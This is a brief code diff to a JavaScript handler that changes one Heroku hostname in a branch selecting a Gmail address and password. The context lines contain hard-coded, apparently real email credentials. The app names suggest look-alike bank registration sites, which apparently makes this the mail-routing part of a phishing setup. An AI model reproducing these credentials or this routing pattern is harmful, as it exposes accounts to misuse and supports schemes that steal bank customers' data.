@@ -22,7 +22,7 @@ export default function handler(req, res) {
         pass = 'ezbvulgxsjerhpnb';
 
     }
-    else if (url == 'daftar-bii-fast.herokuapp.com'){
+    else if (url == 'daftar-bii-fastt.herokuapp.com'){
         email = 'ayamperu233@gmail.com';
         pass = 'rtzqphftdjkdrnwa';
         
